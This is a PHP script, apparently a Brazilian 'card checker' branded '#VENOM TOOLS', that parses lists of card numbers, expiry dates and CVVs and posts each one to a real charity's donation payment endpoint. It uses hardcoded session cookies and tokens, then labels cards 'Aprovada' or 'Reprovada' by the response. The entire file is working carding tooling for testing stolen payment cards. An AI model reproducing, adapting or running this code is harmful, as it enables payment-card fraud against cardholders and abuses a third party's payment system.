<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

function casa ($cc){

    $contents = file_get_contents("bins.csv");
    $pattern = preg_quote(substr($cc, 0, 6), '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$casa = casa($lista);

$random_name = $nomes[mt_rand(0, sizeof($nomes) - 1)];
$random_surname = $sobrenomes[mt_rand(0, sizeof($sobrenomes) - 1)];
$nomeesobre = "$random_name $random_surname";

/*$get = file_get_contents('https://randomuser.me/api/1.2/?nat=br');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];*/

//@LeaoApollo KIBA NAO NETFREE


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    
    
    
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}


 //CURL CC
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bagis.tdv.org/DonationPayment');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'origin: https://bagis.tdv.org',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://bagis.tdv.org/DonationPayment',
    'cookie: TiPMix=96.566401466991',
    'cookie: x-ms-routing-name=self',
    'cookie: .AspNetCore.UserKey=84fca280b3d04d3e8beef858a5e218e8',
    'cookie: .AspNetCore.Currency=949',
    'cookie: .AspNetCore.Antiforgery.9fXoN5jHCXs=CfDJ8J_CxBK0nAtNt7APKw4Mn_algoaQx2tbRUbn7WS1IWFI0nHxO5WIX2t1eVaR1kCK0GgwmLxgvG4J5OvNsQ6TkoniLs0cN4n207c9WUindjJbxmDdDUimEhCMpRaZkYEZ7ZhlbtEqz_DLgfNZDTFS0js',
    'cookie: ARRAffinity=712573b2262d6f13b0ef4166eac9b1b56a8512d94aeafa1ae0da22063008fe09',
    'cookie: ARRAffinitySameSite=712573b2262d6f13b0ef4166eac9b1b56a8512d94aeafa1ae0da22063008fe09',
    'cookie: ai_user=3CbQe|2021-11-15T09:23:17.639Z',
    'cookie: _fbp=fb.1.1636968197765.1634015019',
    'cookie: _ga=GA1.2.65376671.1636968198',
    'cookie: _gid=GA1.2.1044626065.1636968198',
    'cookie: XSRF-TOKEN=CfDJ8J_CxBK0nAtNt7APKw4Mn_ZM2QTLEkUFMbjcAFwNqGP1J_LWmGK52bFrsRJoM2CbYuSESq0qB4eGzrpziCY4T6RdC8nxpLr5H7egocX3OkQq6arDMwRDtCsYW3LY524cHAV924NEGEWZAshy1PWXkJE',
    'cookie: ai_session=iSAbJ|1636968197909|1636968280927.8',

));

curl_setopt($ch, CURLOPT_POSTFIELDS, "CardHolderName=GABRIEL+LIMA&CardNumber=$cc&MonthAndYear=$mes+%2F+$ano&Cvv=$cvv&__RequestVerificationToken=CfDJ8J_CxBK0nAtNt7APKw4Mn_Y4d-A-9Us7GeWXFDnIHtNervJA5uc0xjMjXTCCGV-YkExr6e46XZBPMQ3FcgVG2AKCr8WND9Ak3EKxHzwhi2Fw4E8FN9ChVELhDPL0m-8soCOx3OH4fAVWINkLNXbMHt0");
$retorn = curl_exec($ch);


//echo $retorn;

if(strpos($retorn, "auth.bb")){
	

echo "<font color='#FF0000'>Aprovada</font> <font color='#000000'> :   ".$lista."  ".$casa." | RETORNO:{[CVV INVALIDO]}  </font><font color='red'>#VENOM TOOLS</font><font color='#ffaa00'></font><font color='#aaff00'></font><font color='lime'></font><font color='#00ffaa'></font><font color='#00a9ff'></font><font color='blue'></font><font color='#aa00ff'></font><font color='#ff00aa'></font><br />";
        flush();
        ob_flush();
    }else{
        echo "<font color='#01DF01'>Reprovada</font> :  ".$lista."  ".$casa." | RETORNO: {[NEGADO]}</font><font color='red'>#VENOM TOOLS</font><font color='#ffaa00'></font><font color='#aaff00'></font><font color='lime'></font><font color='#00ffaa'></font><font color='#00a9ff'></font><font color='blue'></font><font color='#aa00ff'></font><font color='#ff00aa'></font><br />";
        flush();
        ob_flush();
}
?>